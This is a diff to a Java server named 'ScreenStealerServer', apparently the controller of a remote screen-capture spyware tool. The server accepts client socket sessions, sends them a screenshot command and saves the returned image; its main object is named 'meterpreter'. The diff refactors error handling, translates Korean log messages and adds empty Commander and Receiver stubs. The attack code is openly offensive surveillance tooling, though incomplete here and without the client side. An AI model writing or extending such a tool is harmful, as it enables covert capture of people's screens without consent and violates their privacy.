@@ -11,6 +11,8 @@ import java.util.Collections;
 import java.util.List;
 
 abstract class pRes {
+	
+	public static final String imageName = "live.jpg";
 
 	public static List<Session> sessionList;
 
@@ -27,8 +29,7 @@ class CaptureManager {
 
 	private DataOutputStream dos;
 	private ObjectInputStream ois;
-	private String fileName;
-
+	
 	private static class Singleton {
 		static CaptureManager INSTANCE = new CaptureManager();
 	}
@@ -37,11 +38,11 @@ class CaptureManager {
 		return Singleton.INSTANCE;
 	}
 
-	public void capture(DataOutputStream dos, ObjectInputStream ois) {
+	public void capture(DataOutputStream dos, ObjectInputStream ois) throws Exception {
 		setStream(dos, ois);
 
 		if (!sendCommand(Cmd.TAKE_SCREEN_SHOT))
-			return;
+			throw new Exception("Session closed");
 
 		byte[] screenCaptureByteArray = getScreenCaptureByteArray();
 		if (screenCaptureByteArray == null)
@@ -59,7 +60,7 @@ class CaptureManager {
 		try {
 			dos.writeUTF(cmd);
 			return true;
-		} catch (IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			return false;
 		}
@@ -81,13 +82,20 @@ class CaptureManager {
 			fos.write(captureImage);
 			fos.close();
 
-			System.out.println("사진을 저장했습니다.");
 			return true;
 		} catch (Exception e) {
 			e.printStackTrace();
 			return false;
 		}
 	}
+}
+
+class Commander {
+	
+}
+
+class Receiver {
+	
 }
 
 class Session implements Runnable {
@@ -106,30 +114,46 @@ class Session implements Runnable {
 			dos = new DataOutputStream(sessionSocket.getOutputStream());
 			ois = new ObjectInputStream(sessionSocket.getInputStream());
 			ip = sessionSocket.getInetAddress().getHostAddress();
-			System.out.println("새로운 세션 : IP : " + ip);
+			System.out.println("New Session connected : " + ip);
 
 			return true;
 		} catch (Exception e) {
-			System.out.println("스트림을 얻는데 실패하였습니다.");
+			System.out.println("Failed to get stream.");
 			return false;
 		}
 	}
 
 	@Override
 	public void run() {
-		getIpAddress();
+		while(true) {
+			try {
+				
+			}catch(Exception sessionClosed) {
+				System.out.println("Session lost : " + ip);
+				return;
+			}
+		}
 	}
 
-	private void getIpAddress() {
-
+	public String getIp() {
+		return ip;
 	}
 
-	private void waitForInterrupt() throws Exception {
-		Thread.sleep(200);
+	public DataOutputStream getDos() {
+		return dos;
+	}
+
+	public ObjectInputStream getOis() {
+		return ois;
 	}
 }
 
 public class ScreenStealerServer {
+
+	public static void main(String[] args) {
+		ScreenStealerServer meterpreter = new ScreenStealerServer();
+		meterpreter.activate();
+	}
 
 	public void activate() {
 		if (!initServer())
@@ -144,7 +168,7 @@ public class ScreenStealerServer {
 			pRes.sessionList = Collections.synchronizedList(new ArrayList<>());
 			return true;
 		} catch (IOException e) {
-			System.out.println("포트가 이미 사용중입니다.");
+			System.out.println("Port " + pRes.LISTEN_PORT + " is already used.");
 			return false;
 		}
 	}
@@ -158,10 +182,5 @@ public class ScreenStealerServer {
 				e.printStackTrace();
 			}
 		}
-	}
-
-	public static void main(String[] args) {
-		ScreenStealerServer meterpreter = new ScreenStealerServer();
-		meterpreter.activate();
 	}
 }
